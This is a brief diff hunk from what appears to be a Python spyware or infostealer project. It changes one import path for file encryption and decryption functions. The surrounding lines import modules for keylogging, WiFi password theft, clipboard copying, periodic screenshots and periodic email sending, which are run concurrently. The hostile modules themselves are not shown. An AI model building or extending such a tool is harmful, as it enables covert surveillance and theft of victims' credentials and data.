@@ -4,7 +4,7 @@ from concurrent.futures import ThreadPoolExecutor
 from data_collection import computer_information, keylogger, wifi_passwords, copy_clipboard
 from screenshot_capture import periodic_screenshot_capture
 from send_email import send_emails_periodically
-from encrypt_and_decrypt import encrypt_files, decrypt_files
+from cryptography.encrypt_and_decrypt import encrypt_files, decrypt_files
 
 def start_program():
     """Starts the program by executing tasks concurrently using ThreadPoolExecutor."""
